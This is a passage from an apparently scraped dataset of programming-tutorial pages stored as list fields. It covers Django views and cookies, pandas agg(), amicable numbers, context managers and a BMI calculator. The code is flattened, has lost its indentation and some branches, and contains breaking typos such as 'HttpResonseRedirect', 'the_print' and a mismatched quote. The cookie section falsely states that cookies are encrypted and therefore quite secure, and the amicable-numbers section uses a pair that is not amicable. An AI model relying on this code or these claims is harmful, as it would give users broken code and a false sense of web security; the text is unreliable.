based view."", 'Django provides a set of mixins, and generic class-based views. With the help of these tools we can solve the most common tasks in web development.', 'It saves us to writing same code again and again. In the below example, we can modify MyCreateView to inherit from django.views.generic.CreateView.']","['Django is based on the MVT pattern means Model View Template. We mainly use the two-types of view - function-Based views and class based views. If you are beginners, you must be aware from the function based views (FBV).', 'When Django was introduced, it only supported the function-based view but later Django added the concept of the class-based views. The class-based views reduce the redundancy of the code. It also supports the DRY concept of the Django.', 'In this tutorial, we will learn in-depth how the FBV and CBC are different from each other. We can perform the same task using the function-based views and class-based views. But both approaches are different.', 'Function-based views are simple to use and beginners can easy understand them. It helps to understand the core concept of the Django fundamentals. FBV provides the advantages to understand the django concept from scratch.', 'It is slightly hard to get the concept of class-based views for beginners. You should go through the documentation, and you will have study properly. If you have a clear idea about the function based views, you can move to the class based views.', 'We call the as_view() method to serve the request to the user. The as_view() method calls the dispatch() method to determine which class method needs to executed, depending on the HTTP request. We can implement it in following way.', 'When we use the Django generic class-based views, we can over-write the helper method like get_form_class and get_template_names. We can also add some custom logic at these points instead of just overriding the class attributes.', 'ModelFormMixin is one of the best examples. The form_valid method is overridden with the updated value stored in self.object form_valid method is overridden.', 'With the help of generic class based view, we can perform some important task such as creating a new object, list views, pagination, form handling, archive views, delete view, etc.', 'We can implement this by importing the django.views.generic. Generic class-based views are excellent way to perform some essential tasks. It speeds up the development process.', ""As we can observe that, it takes very less code in comparison of previous views. The django.views.generic.CreateView comes with the lots of built-in functionality and shortcuts. Let's discuss few more details."", 'By default template should reside in /<modelname>/<modelname>_form.html. We can modify it by setting the class attributes template_name and template_name_sufix.']","[""Django project usually have the CRUD operations, so we need to implement same code for the multiple times unnecessarily and that's why the Django class-based views come into the scenario. The class based-views are created to solving the code redundancy problems. Let's understand the following pros and cons of the FBV."", 'Class-based views are advance way to create views in Python. It is implemented in the project as Python objects instead of functions. It is not a substitute of FBV, but they provide advantages over the function based views. It reduces the code repetition and takes cares of the basic operations such as deleting and adding item.', 'This is a hot debate among the developers that which views are best to use Class-based or function-based views? We have discussed the use, cons, and pros of both types of the views. It totally depends the project requirement and what you are comfortable for. In some cases, class-based view performs well and in some case function based is better.']","['def  create_view(request, pk):', ""template_name = 'form.html'"", 'form_class = MyForm', 'form = form_class', ""if request.method == 'POST':"", 'form = form_class(request.POST)', 'if form.is_valid():', 'form.save()', ""return HttpResponseRedirect(reverse('list-view'))"", ""return render(request, template_name, {'form': form})"", 'class MyCreateView(View):', ""template_name = 'form.html'"", 'form_class = MyForm', 'def get(self, request, *args, **kwargs):', 'form = self.form_class', ""return render(request, template_name, {'form': form})"", 'def post(self, request, *args, **kwargs):', 'form = self.form_class(request.POST)', 'if form.is_valid():', 'form.save()', ""return HttpResonseRedirect(reverse('list-view'))"", 'else:', ""return render(request, self.template_name, {'form': form})"", 'urlpatterns = [', ""url(new/', MyCreateView.as_view(), name='original-create-view'),"", ""url(new_two/', MyCreateView.as_view(), name='modified-create-view')"", 'from django.views.generic import CreateView', 'class FirstCreateView(CreateView):', 'model = MyModel', 'form_class = MyForm', 'from django import forms', 'from . models import MyModel', 'class MyModelForm(forms.ModelForm):', 'class Meta:', 'model = MyModel', ""fields = ['name', 'description']""]",[],[],"[""|||The first positional argument of the view should be|||It should return the HttpResponse object, or it should raise an exception.|||Django views are callable. We can use both methods either function-based or class-based. While using CBVs we inherit the method as_view() that uses the dispatch() method to call the method appropriate depending on the HTTP requests.||||||Easy to implement, read and understand|||Explicit code flow|||Decorator can be implemented easily|||Good for one-off or specialized functionality|||Helps to understand the core concept of the Django.||||||Code Redundancy is the biggest concern of FBV.|||Condition branching will be used handle HTTP request.|||Hard to extend the code.||||||One of the biggest advantages of CBV is inheritance. CBV allows us to inherit another class and can be modified for the different use cases.|||It supports the DRY principle. It prevents the repetition of the code. Code reusability is possible in the class based views.|||It comes with the built-in generic class-based views.|||The class based views provides the proper code structuring. We can use the different class instance method (instead of conditional branching statement inside function-based-views) to generate the HTTP requests.||||||Hard to understand the complex to implement.|||Implicit code flow.|||Extra import or method override required in view decorators.||||||In the CreateView class, we need to specify the model name and form_class_attributes.|||We also need to specify the success_url that will redirect to that mentioned page after successful form submission. It can be done using get_absoute_url(). |||We can specify the fields' class attributes on the view. Below is the example of form fields.|||""]"
288,"['How to handle cookies in Django - The way to set cookies', '{0}You have requested this page {1} times']","['Handling cookies are the importance concept of the web application. Django provides a straightforward way to interact with cookies. Cookies allow us to store and retrieving the data that is saved in the session. Session and Cookies are different from each other, which we will discuss in the further tutorial. These cookies are defined with the time limit; these will automatically delete after a specified time.']","['https://www.javatpoint.com/agg-function-in-python', 'https://www.javatpoint.com/class-based-views-vs-function-based-views', 'https://www.javatpoint.com/https://www.javatpoint.com/django-cookie', 'https://www.javatpoint.com/https://www.javatpoint.com/django-tutorial', 'https://www.javatpoint.com/agg-function-in-python', 'https://www.javatpoint.com/class-based-views-vs-function-based-views', 'https://www.javatpoint.com/agg-function-in-python']","['https://static.javatpoint.com/python/images/how-to-handle-cookies-in-django.png', 'https://static.javatpoint.com/python/images/how-to-handle-cookies-in-django2.png', 'https://static.javatpoint.com/python/images/how-to-handle-cookies-in-django3.png', 'https://static.javatpoint.com/python/images/how-to-handle-cookies-in-django4.png', 'https://static.javatpoint.com/python/images/how-to-handle-cookies-in-django5.png', 'https://static.javatpoint.com/python/images/how-to-handle-cookies-in-django6.png']",[],"['What are the cookies in Django?', 'How to Django Cookies Work?', 'Why we need cookies in Django?', 'Cookies Attributes in Django', 'Django Cookie Implementation', 'Updating Cookie', 'Delete Cookie in Django', 'Difference Approach to Handle Cookie', 'Read Cookie from Request', 'Django Cookie Enable and Disable', 'Important Points of Cookies', 'An Issue with Django Cookie Security', 'Limitation of the Django Cookies', 'Conclusion']","['Set cookies in Django', 'Get cookies in Django']",[],"[""Let's have an introduction to the cookies."", 'Cookies provide many facilities that are not possible with HTTP.', ""Let's understand how the cookie works on the internet."", 'Cookies are also used for product recommendations on several eCommerce websites.', ""This attributes is used to set cookies that the server sends to the user's browser to save the data. Below is the syntax of cookie() method."", 'name - It specifies the cookie name.', 'value - It is used to the specifies the specific value that we want to store in the user computer.', 'max_age - It is used to define the time limit of the cookie. If time limit is not specified, it will active until the browser is closed.', 'Expires - It is a string in the format ""Wdy DD-Mon-YY HH:MM:SS GMT or a datetime. The max_age will be determined if expires is a datetime object.', 'The server uses the get cookies to read the previously delivered cookies data. We can use the following syntax.', ""Let's see how we can set the Django cookies manually."", 'In the following steps, we will set the cookie using Django. Create the all required configuration and include the following code in view.py.', 'Now, map this view to urls.py.', 'Here, we will write the view for the get cookies.', 'Explanation of the above code -', 'In the above view.py, we have used the HttpResponse method that displays any output to the screen.', 'Now, run the server using the following command.', ""We can modify a defined cookie. Let's see the following example."", 'After the updating the cookie, we need to append it into the urls.py file.', 'Now, we run the server and visit the below page.', 'Instead of using Httpresponse we can use the redirect function to update a cookie. Yet, here we will use the set cookies function.', 'Now, we will add the update using the render function.', ""Now, we will learn how to delete the cookies already placed in the user's computer."", 'As we know that there is an optional parameter max_age that deleted the cookie session by default.', 'To delete the cookie, we add the following code in views.py file.', 'Now, we add this view to urls.py file.', 'We have discussed in above section.', 'Using this method on the request object, we can easily get the particular value. Below is the syntax of this method.', 'We will need to redirect(), so import it now.', 'We will need to redirect(), so import it now.', 'Code for cookies', 'Below are some important points that you should keep in mind.', 'Along with the advantages of cookies, there are disadvantages of the cookies.']","['This tutorial will discuss how we can manage the cookie in Django and why they are useful on the internet. We will also discuss how to create cookies using the server.', ""The request is sent by the user using the HTTP protocol, but this is stateless. It won't help to recognize whether the user is new or has previously visited the site."", 'The cookie contains the unique session id used to identify the user and other relevant information to the website context. The website sends the cookie with the unique user identity when we log in to a website.', 'Cookies are used for various purposes, such as login to a website or online shopping. Many companies use as to track user preference. Cookies are used differently by various websites depending on their needs.', 'When we log in to an eCommerce site or Facebook without signing out, it remains signed for the next time we visit our account. Cookies are used to accomplish this (which contains user-session information).', ""A cookie attribute can perform two tasks - it can set cookies to the user computer and access those cookies. Let's understand these concepts in detail."", ""We define the cookie in the separate functions - The first function will set the cookies to the user's computer and second function with the variable in the COOKIE appended to it for displaying or receiving the cookie that has been set."", ""The 'expires' attribute can be used for handling the end of cookie session. We can modify the expire function and know how to delete a cookie. Let's see the following syntax."", 'Cookies are sent with the user request by the website. As a result, the server obtains a cookie with each request. Django provides the easy way to access the cookie.', 'By default, they are set to FALSE. Cookies are encrypted, so these are quite secure. The session cookie can be used to track how many times a user visits a specific website.']","['When we visit any website and log in to that page, it asks for the storage of our user id and password and the auto-filling of a few details based on our previous logged-in session. These all process is accomplished by the cookies. In Addition, we can store the cookie on the client computer to make user interaction easier.', 'Cookies are also known as HTTP cookies. It is a small text file created by the web browser and maintains in response to a specific Web-Server request. The text file saves locally on the computer, and most browsers will show the cookies generated under the Privacy and Security settings.', 'The settings Python file defines which cookies are enabled and disabled. The session variable is available in the settings that are used to handle session cookies. We can enable and disable the cookie manually by setting, updating, and deleting cookies. There are session-level cookies that can be set to true if necessary.', ""We have discussed all the important concept of the Django cookies and how we can use them into our projects. We have defined how to set, get, update and delete the cookies. The cookies help to identify the user and quick retrieval of data. The system doesn't always go to the database, and search for it, return the result to the user.""]","['set_cookie(cookie_name, value, max_age = None, expires = None)', ""request.COOKIES['cookie_name']"", 'def setcookie(request):', 'html = HttpResponse(""<h1>Welcome to Django Website</h1>"")', ""html.set_cookie('Django', 'We are setting a cookie', max_age = None)"", 'return html', ""path('setcookie', views.setcookie)"", 'def getcookie(request):', ""show = request.COOKIES['Django?]"", 'html = ""<center> New Page <br>{0}</center>"".format(show)', 'return HttpResponse(html)', ""path('getcookie', views.showcookie),"", 'python manage.py runserver', 'def updating_cookie(request):', 'html = HttpResponse(""We are updating  the cookie which is set before"")', ""html.set_cookie('JavaTpoint','Updated Successfully')"", 'return html', ""path('updating_cookie', views.updating_cookie),"", 'def deleting_cookie(request):', 'html = HttpResponse(""Deleting the cookie which is set"")', ""html.delete_cookie('JavaTpoint','Updated Successfully')"", 'return html', ""path('delete_cookie',views.deleting_cookie),"", ""response.cookies['cookie_name']['expires'] = datetime.today() + timedelta(days= number_of_days)"", ""COOKIES.get('cookie_name', 'value')"", 'def setcookie(request):', ""if request.COOKIES.get('visits') is not None:"", ""value = request.COOKIES.get('visits')"", ""text = request.COOKIES.get('JavaTpoint')"", 'html = HttpResponse(""{0}You have requested this page {1} times"".format(text, value))', ""html.set_cookie('visits', int(value) + 1)"", 'return html', 'else:', ""return redirect('/setcookie')""]",[],[],"[""|||The browser sends request to the server.|||The server sends a response to the browser along with one or more cookies.|||The browser or client received the cookies and saved them as a text file. Every time the user sends requests, the browser will send this cookie to the server until the cookies expire.|||The cookie is removed from the browser when it expires.||||||Using request.COOKIES[]||||||Using request.COOKIES.get()||||||Cookies are never used to store sensitive data such as passwords. The reason is that the cookies store in a plain text file, and anyone can read that sensitive data.|||Many browsers don't allow saving cookies more than 4kb of data.|||Let' suppose a website put 10 cookies of 4kb in size. Once the cookie is placed in the user's computer, it will be sent to the server with each request. Every time the user requests the server, it must send an additional 40kb of data.|||The user can disable the feature of accepting cookies or delete the cookie permanently altogether.||||||Cookie data can be misused.|||We can easily track the user.|||The client may delete the cookies.||||||The cookie can store the 4096 bytes of Data.|||Both the browser and server can store cookies.|||""]"
289,['agg() function in Python'],"['Because of the fantastic ecosystem for the data-centric Python packages, Python is considered as one of the great programming languages for doing data analysis. Panda is one of such packages that is provided to us in Python, and it makes it very easy to import and analyze the data.']","['https://www.javatpoint.com/amicable-numbers-in-python', 'https://www.javatpoint.com/how-to-handle-cookies-in-django', 'https://www.javatpoint.com/amicable-numbers-in-python', 'https://www.javatpoint.com/how-to-handle-cookies-in-django', 'https://www.javatpoint.com/amicable-numbers-in-python']",[],[],"['Introduction: Pandas agg() function', 'Working with agg() function']","['Syntax', 'Parameters:', 'Return type', 'Passing a single function inside agg() method', 'Passing a list of functions inside agg() method:']",[],"['In this tutorial, we are going to discuss the agg() function given to us in the panda series, and we will use it with series data given to us.', 'In this section, we are going to look at the syntax and parameters that we have to use inside the agg() method and return type of the function.', 'The seriesGiven is the data series given to us in the program.', 'We have to provide the following parameters inside the agg() method.', 'Example 1: Look at the following Python program:', 'Explanation:', 'First, we have imported pandas and numpy modules inside our program to use its functions.', 'As we can see in the output, 3 is added to each value of the series after we have performed an operation on it.', 'Example 2: Look at the following Python program:', 'Explanation:']","['The return type of agg() method is not fixed, and it always depends upon the return type of the function that we have passed as a parameter inside the agg() method.', 'Till now, we have learned about the introduction and syntax for using agg() function provided to us in Pandas. To learn about and understand the working of the agg() method, we will use this function in below examples.', 'Then, we have a created an array of 20 elements that we have randomly generated using the randn() function of the numpy module. After that, we made the array into the series form using the series() function of the panda module.']","['We use the agg() function of Pandas to pass a single function or list of functions that are to be applied on a given data series or sometimes even separately to each element of the data series. In the case where we pass a list of functions inside the agg() function, multiple results will be returned by it.', ""In this example, we will create a random array by numpy module, and then we will make it a data series using the Pandas function. After that, we will use the agg() function and pass a lambda function, as an argument inside it, and thus it will add 3 to each value given in the series. As we are applying the function to a series, the return type we get through the agg() function is also series. Now, let's understand this implementation through the following example."", 'Then, we have used the agg() function on the series and passed the lambda function as an argument in it. We have passed an argument in the agg() method to add 3 to each value of the series. In last, we printed the data series in the output (both before the operation performed on it and after the operation performed on it).', ""In this example, after creating the data series, we will pass a list of functions as the arguments inside the agg() function instead of passing a single function parameter in it. When we pass a list of Python's default functions as arguments in the agg() method, multiple results are returned by it into multiple variables. Let's understand the implementation of this method through the following example."", ""After creating a data series as we did in the previous example, we have created a list where we have multiple functions' names in it. In this example, instead of giving a single function as an argument, we have passed multiple default functions inside the agg() function. After passing these functions as arguments, we have printed the data series before operation and after operation in the output."", 'As we look at the output, we can see that multiple results have been returned by agg() function. This is because we have passed multiple functions as parameters inside it. The max(), min() and sorted() have been returned into different variables i.e., seriesResult1, seriesResult2 and seriesResult3 respectively.']","['seriesGiven.agg(function_name, axis = 0)', '# Importing panda module as pnd', 'import pandas as pnd', '# Importing numpy module as nmp in program', 'import numpy as nmp', '# Creating random array of 20 elements with numpy random', 'randomArray = nmp.random.randn(20)', '# Creating series from array of random elements', 'dataSeries = pnd.Series(randomArray)', '# Calling agg() method for data series', 'resultSeries = dataSeries.agg(lambda num : num + 3) # Lambda function as an argument', '# Displaying before and after operation results', ""print('Data series of elements before operation: \\n', dataSeries,"", ""'\\n\\n Data series of elements after operation: \\n', resultSeries)"", '# Importing panda module as pnd', 'import pandas as pnd', '# Importing numpy module as nmp in program', 'import numpy as nmp', '# Creating random array of 20 elements with numpy random', 'randomArray = nmp.random.randn(20)', '# Creating series from array of random elements', 'dataSeries = pnd.Series(randomArray)', '# Creating a list having function names in it', 'functionList = [min, max, sorted]', '# Calling agg() method with list of functions', 'seriesResult1, seriesResult2, seriesResult3 = dataSeries.agg(functionList)', '# Displaying elements of data series', ""print('Data Series before operation: \\n', dataSeries)"", ""print('\\nMinimum value in the data series = {}\\n\\nMaximum value in the data series = {},\\"", ""\\n\\nSorted data series after operation:\\n{}'.format(seriesResult1, seriesResult2, seriesResult3))""]","['Data series of elements before operation:', '0    -0.510111', '1    -0.732670', '2    -0.451550', '3    -0.435085', '4     0.082848', '5    -1.051242', '6     0.203565', '7    -1.014079', '8    -0.232350', '9    -0.325640', '10    0.528320', '11   -1.472293', '12   -0.639487', '13   -2.490666', '14   -0.242837', '15    0.854955', '16    1.076247', '17    1.491347', '18   -1.767788', '19   -0.205003', 'dtype: float64', 'Data series of elements after operation:', '0     2.489889', '1     2.267330', '2     2.548450', '3     2.564915', '4     3.082848', '5     1.948758', '6     3.203565', '7     1.985921', '8     2.767650', '9     2.674360', '10    3.528320', '11    1.527707', '12    2.360513', '13    0.509334', '14    2.757163', '15    3.854955', '16    4.076247', '17    4.491347', '18    1.232212', '19    2.794997', 'dtype: float64', 'Data Series before operation:', '0     1.324659', '1    -1.632943', '2    -0.451046', '3    -0.119475', '4    -1.476469', '5     1.550481', '6    -0.345283', '7    -0.391220', '8     1.183295', '9     0.945834', '10    0.426908', '11   -1.373141', '12   -1.360714', '13    1.029160', '14   -0.305868', '15    0.520776', '16    0.519891', '17    0.581810', '18   -0.200537', '19    2.175055', 'dtype: float64', 'Minimum value in the data series = -1.6329428122607905', 'Maximum value in the data series = 2.175055294872539,', 'Sorted data series after operation:', '[-1.6329428122607905, -1.476468968840359, -1.3731412602339488, -1.3607141137838996, -0.45104603430414114, -0.3912204479169106, -0.34528253055365704, -0.3058683242351637, -0.20053665016862435, -0.1194753076622943, 0.4269084920204909, 0.519891496565306, 0.5207757216248261, 0.5818098237803292, 0.9458337130436504, 1.02915996695176, 1.1832945335240084, 1.324659481096391, 1.5504805147479754, 2.175055294872539]']",[],"[""|||Function_name: We have to provide a function, list of functions, or string that contains the name of functions to be called on the data series as a parameter inside the agg() method.|||axis: Axis works like defining the index for rows of data series. We can either give axis equals to 0 or provide 'index' for performing a row-wise operation on data series. Also, we can give either 1 or 'column' in the axis parameter to perform a column-wise operation on the data series.|||""]"
290,['Amicable Numbers in Python'],"['In this tutorial, we will learn how to get amicable numbers in Python. First, we will understand what amicable numbers are and how they can be used.']","['https://www.javatpoint.com/context-manager-in-python', 'https://www.javatpoint.com/agg-function-in-python', 'https://www.javatpoint.com/context-manager-in-python', 'https://www.javatpoint.com/agg-function-in-python', 'https://www.javatpoint.com/context-manager-in-python']",[],[],"['How to check if two numbers are amicable in Python', 'How to get count of pair of amicable pairs from the list']",[],[],"['Amicable numbers are two different numbers so related that the sum of the proper divisor of each is equal to the other number.', 'In other words, the sum of the all proper divisor of x and the sum of all proper divisor y should be equal to the opposite number.', 'The sum of the proper divisor of 123 should equal 426, and the proper divisor of 426 should equal 123.', 'Following are the steps to find whether two numbers are amicable or not.', ""Let's see another output."", 'Explanation -', 'This is a simple way to get the count of amicable number pair. We traverse each pair and check if they form an amicable pair.']","['Suppose we have two numbers, 123 and 426, we need to find all the proper divisors of 123 and 426; then we do the sum of the proper divisor of 123 and the same with the 426.', ""We have two lists of integer number, where we will pick each number from both lists and compare them. If the numbers are amicable, increment the count and return. Let's understand the following example.""]","['In the above example, we take the user input and store it in separate variables. We used for loop and if statement to find the proper divisor of both the numbers. Then we find the sum of the proper divisors of both the numbers. Using the if statement, we checked if the sum of the proper divisor of the numbers equals the other number and vice-versa.']","['sum_x = y and sum_y = x', ""x=int(input('Enter first number : '))"", ""y=int(input('Enter second number : '))"", 'for i in range(1,x):', 'if x%i==0:', 'sum1+=i', 'for j in range(1,y):', 'if y%j==0:', 'sum2+=j', 'if(sum1==y and sum2==x):', ""print('Given numbers are Amicable!')"", ""print('Given numbers are not Amicable!')"", '# Python3 program to count', '# amicable pairs in an array', '# Calculate the sum', '# of proper divisors', 'def sumOfDiv(x):', 'sum = 1', 'for i in range(2, x):', 'if x % i == 0:', 'sum += i', 'return sum', '# Check if pair is amicable', 'def CheckAmicable(a, b):', 'if sumOfDiv(a) == b and sumOfDiv(b) == a:', 'return True', 'else:', 'return False', 'def countPairs(arr, n):', 'count = 0', 'for i in range(0, n):', 'for j in range(i + 1, n):', 'if CheckAmicable(arr[i], arr[j]):', 'count = count + 1', 'return count', 'list1 = [220, 284, 1184,', '1210, 2, 5]', 'n1 = len(list1)', 'print(countPairs(list1, n1))', 'list2 = [2620, 2924, 5020,', '5564, 6232, 6368]', 'n2 = len(list2)', 'print(countPairs(list2, n2))']","['Enter first number : 220', 'Enter second number : 284', 'Given numbers are Amicable!', 'Enter first number : 365', 'Enter second number : 456', 'Given numbers are not Amicable!', '2', '3']",[],"['|||First, take the two integer number as an input from the user.|||Get the proper divisor of the both numbers and do the sum of them.|||Now check whether the given number is equal to opposite numbers.|||If they are equal then they are Amicable else not.|||And we get the output.|||']"
291,['Context Manager in Python'],"['In this tutorial, we will learn about ""Context Manager"" in Python and how it is helpful in managing resources, files descriptors, and database connections.']","['https://www.javatpoint.com/create-bmi-calculator-using-python', 'https://www.javatpoint.com/amicable-numbers-in-python', 'https://www.javatpoint.com/create-bmi-calculator-using-python', 'https://www.javatpoint.com/amicable-numbers-in-python', 'https://www.javatpoint.com/create-bmi-calculator-using-python']",[],[],"['How to Manage Resources using Context Manager', 'File Management by using Context Manager:', 'How to perform File Management by using Context Manager and ""with"" Statement', 'How to Manage the Database Connection by using Context Manger', 'Conclusion']",['How to Create a Context Manager:'],[],"['Managing Resources:', 'The users use resources like file operations, or database connections are very common in any programming language.', 'But all these resources have a limit. Therefore, the main problem is to make sure these resources will release after usage.', 'Example 1:', 'Example 2:', 'When the user creates a context manager, they need to make sure that the class has the following methods: __enter__() and __exit__().', 'The __enter__() method will return the resource that has to be managed.', 'The __exit__() method will not return anything but perform the clean-up operations.', ""Let's see an example:"", 'After the user execute the ""with"" statement block, the operations will get executed in the following sequence:', 'Install pymongo:', 'To manage the database connection through the content manager, the user first has to install the ""pymongo"" library by using the following command:', 'Explanation:', 'In the above code, after executing the ""with"" statement block, the following operations will happen in the sequence.']","[""Let's see an example of file management. When a file is opened, the file descriptors will be consumed, which is a limited resource. The process can open only a limited number of files at a time."", 'It is tough to close a file in all the places if the block of the program raises an exception or has any complex algorithm with numerous return paths.', 'In the above code we have created the ""context_manager"" object. That is assigned to the variable after the ""as"" keyword, that is, manager. After running the program, the following methods got executed in the sequence:', 'Now, we will apply the above concept for creating the class, which can help in file resource management. The ""file_manager"" class will help open the file, read or write content, and then close the file.', 'In this tutorial, we have discussed content manager in Python, how to create Content Manager, and how it can help in Resources Management, File management, and managing Database connections.']","['Because if they are not released, this could lead to resources leakage, which may cause either slow down the system or crash. If the machine is set up in the system of users, which can automatically teardown the resources, it can be very helpful. In Python, the users can achieve this by using context managers, which are used for facilitating the proper handling of the resources. The most popular way of performing file operations is by using the ""with"" keyword in Python.', 'The above example is the case of the file descriptors leakage. An error occurred saying, ""Too many open files"". This has happened because there are so many open files, and they are not closed. There may be a chance where the users may have forgot to close the open files.', 'Most of the time, the users use ""try-except-finally"" in other programming languages while working with the file to make sure that the file resource is closed after usage, even if there is an exception. But in Python, they can use ""Context Manager"" for managing resources. The users can use the ""with"" keyword. When it gets evaluated, it will result in an object that can perform context management. We can write context managers by using classes or functions with decorators.', 'Now, we will show how to create a simple database connection management system. There is a limit in opening the number of database connections at a time, sane as File descriptors. Therefore, we use context manager, as it is helpful in managing the connections to the database as the user might have forgotten to close the collection.']","['with open(""text_file.txt"") as file:', 'data = file.read()', 'file_descriptors = []', 'for Y in range(10000):', ""file_descriptors.append( open ('test_file.txt', 'w'))"", 'class context_manager():', 'def __init__(self):', 'print (""The \'init\' method is called"")', 'def __enter__(self):', 'print (""The \'enter\' method is called"")', 'return self', 'def __exit__(self, exc_type, exc_value, exc_traceback):', 'print (""The \'exit\' method is called"")', 'with context_manager() as manager:', 'print (""The \'with\' statement is block"")', 'class file_manager():', 'def __init__(self, file_name, mode):', 'self.filename = file_name', 'self.mode = mode', 'self.file = None', 'def __enter__(self):', 'self.file = open(self.filename, self.mode)', 'return self.file', 'def __exit__(self, exc_type, exc_value, exc_traceback):', 'self.file.close()', '# At last, load the file', ""with file_manager('test_file.txt', 'w') as file:"", ""file.write('JavaTpoint')"", 'print (file.closed)', '!pip3 instal pymongo', 'from pymongo import MongoClient as moc', 'class mongo_db_connection_manager():', ""def __init__(self, host_name, port = '27017'):"", 'self.hostname = host_name', 'self.port = port', 'self.connection = None', 'def __enter__(self):', 'self.connection = moc(self.hostname, self.port)', 'return self', 'def __exit__(self, exc_type, exc_value, exc_traceback):', 'self.connection.close()', '# Now, connect with a localhost', ""with mongo_db_connection_manager('localhost', 27017) as mongo:"", 'collection_1 = mongo.connection.SampleDb.test', ""data_1 = collection_1.find({'_id': 142})"", 'print (data_1.get(name))']","['OSError                                   Traceback (most recent call last)', 'in', '1 file_descriptors = []', '2 for Y in range(10000):', ""----> 3 file_descriptors.append( open ('test_file.txt', 'w'))"", ""OSError: [Errno 24] Too many open files: 'test_file.txt'"", ""The 'init' method is called"", ""The 'enter' method is called"", ""The 'with' statement is block"", ""The 'exit' method is called"", 'True', 'Test']",[],"['|||First, we will create a simple class named ""context_manager"" for understanding the basic structure of creating a context manager by using the class method.||||||__int__() |||__enter__()|||Body of statement, which is the code inside the ""with"" statement block.|||__exit__(), In this method, the parameters are used for managing the exceptions. ||||||A ""file_manager"" object will be created with ""text_file.txt"" as the file name, and ""w"" (write) as the mode when the __init__() method will be executed.|||The __enter__() method will open the ""text_file.txt"" in the write mode and returns the ""file_manager"" object to the variable ""file"".|||The text ""JavaTpoint"" will be written into the file. ||||||The __exit__() method will take care of closing the file after exiting the ""with"" statement block, which is a teardown operation.|||When the ""print (file.closed)"" statement runs, the users will get the output ""True"" as the ""file_manager"" would have already closed the file, which otherwise would be needed to be explicitly done.|||||||||The ""mongo_db_connection_manager"" object will be created with ""localhost"" as the ""host_name"" and port is equal to ""27017"", when the __init__() method executed.|||The __enter__() method will open the ""mongodb"" connection, and it will return the ""mongo_db_connection_manager"" object to the variable ""mongo"".|||The ""SampleDB"" database will access the ""test"" connection, and the document with the ""_id = 147"" will be retrieved. It will print the name filed of the document.|||The __exit__() method will take care of closing the file after exiting the ""with"" statement block, which is a teardown operation.|||']"
292,['Create BMI Calculator using Python'],"['In the following tutorial, we will understand how to create a Body Mass Index (BMI) Calculator with the help of the Python programming language. But we get started creating one; let us briefly discuss what Body Mass Index (BMI) is.']","['https://www.javatpoint.com/string-to-binary-in-python', 'https://www.javatpoint.com/context-manager-in-python', 'https://www.javatpoint.com/string-to-binary-in-python', 'https://www.javatpoint.com/context-manager-in-python', 'https://www.javatpoint.com/string-to-binary-in-python']",['https://static.javatpoint.com/python/images/create-bmi-calculator-using-python.png'],[],"['Understanding the Body Mass Index (BMI)', 'Understanding the working of BMI Calculator', 'Creating BMI Calculator using Python', 'Source Code']",[],[],"['A BMI Calculator accepts the weight and height of an individual and calculates the Body Mass Index (BMI) of that person.', 'Body Mass Index (BMI) is a measure of body fat on the basis of height and weight, respectively.', 'On the basis of the BMI of an individual, the calculator returns a statement stating the overall health of the person.', 'The following table shows how the classification of BMI is done in order to identify the health status of a person.', 'Now, let us begin coding the project.', 'File: BMI_Calculator.py', 'Explanation:', 'Next, we will calculate the Body Mass Index.', 'We will use the following formula in order to calculate BMI.', 'Let us implement the above formula in the Python program.', 'File: BMI_Calculator.py', 'Explanation:', 'Now, let us print the BMI.', 'File: BMI_Calculator.py', 'Explanation:', 'In the above snippet of code, we have printed a statement stating BMI of the person.', 'We will use the if-elif-else conditions for classification.', 'File: BMI_Calculator.py', 'Explanation:', 'The program will print the statement on the following basis:', 'Hence, the program is completed.', 'Let us see the complete source code for the program and output for the same.', 'File: BMI_Calculator.py']","['We can consider Body Mass Index (BMI) as a substitute for direct measurements of body fat. Besides, BMI is a low-cost and easy-to-perform method of screening for weight classes that may cause health-related problems.', 'For Example, if the height and weight of a person are 155 cm and 57 kg. The BMI of that person will be 23.73 (approx.), which signifies that the person is healthy.', 'As the first step, we will create a New Python program file and name it BMI_Calculator.py. Within this file, we will begin by creating a block of code to ask the user their height and weight. We can easily accomplish this using the input() function.', 'In the above snippet of code, we have defined a function for BMI using the above formula. We have divided the height by 100 to convert the centimeters into meters.', 'Now, we will print the statement stating the present health of the user based on their BMI. This block of code will be quite simplified for better understanding.', 'In the above snippet of code, we have used the value of the variable the_BMI in the if-elif-else statement to check if the BMI of the person lies within one of the categories.']","['BMI, short for Body Mass Index, is a measure of relative weight based on the mass and height of an individual. We generally use the Body Mass Index in order to categorize people on the basis of their height and weight. These categories are underweight, healthy, overweight, and even obesity. Moreover, it is also adopted by various countries in order to promote healthy eating.', 'In the above snippet of code, we have defined two variables as the_height and the_weight which uses the input() function to accept input from the user. We have also included the float() function outside the input() function in order to convert the input string into the float data type so that we can perform calculations with it.']","['# asking for input from the users', 'the_height = float(input(""Enter the height in cm: ""))', 'the_weight = float(input(""Enter the weight in kg: ""))', '# defining a function for BMI', 'the_BMI = the_weight / (the_height/100)**2', '# printing the BMI', 'print(""Your Body Mass Index is"", the_BMI)', '# using the if-elif-else conditions', 'if the_BMI <= 18.5:', 'print(""Oops! You are underweight."")', 'elif the_BMI <= 24.9:', 'print(""Awesome! You are healthy."")', 'elif the_BMI <= 29.9:', 'the_print(""Eee! You are overweight."")', 'print(""Seesh! You are obese."")', '# asking for input from the users', 'the_height = float(input(""Enter the height in cm: ""))', 'the_weight = float(input(""Enter the weight in kg: ""))', '# defining a function for BMI', 'the_BMI = the_weight / (the_height/100)**2', '# printing the BMI', 'print(""Your Body Mass Index is"", the_BMI)', '# using the if-elif-else conditions', 'if the_BMI <= 18.5:', 'print(""Oops! You are underweight."")', 'elif the_BMI <= 24.9:', 'print(""Awesome! You are healthy."")', 'elif the_BMI <= 29.9:', 'the_print(""Eee! You are over weight."")', 'print(""Seesh! You are obese."")']","['Enter the height in cm: 160', 'Enter the weight in kg: 61', 'Your Body Mass Index is 23.828124999999996', 'Awesome! You are healthy.']",['S. No.|||BMI|||Weight Status&&&1|||Below 18.5|||Underweight&&&2|||18.5 - 24.9|||Normal&&&3|||25.0 - 29.9|||Overweight&&&4|||30.0 and above|||Obese'],['|||If BMI is less than or equal to 18.5 then the program returns the condition for underweight.|||If BMI is less than or equal to 24.9 then the program returns the condition for Healthy.|||If BMI is less than or equal to 29.9 then the program returns the condition for overweight.|||If none of the above conditions are True then the program returns the condition for obese.|||']
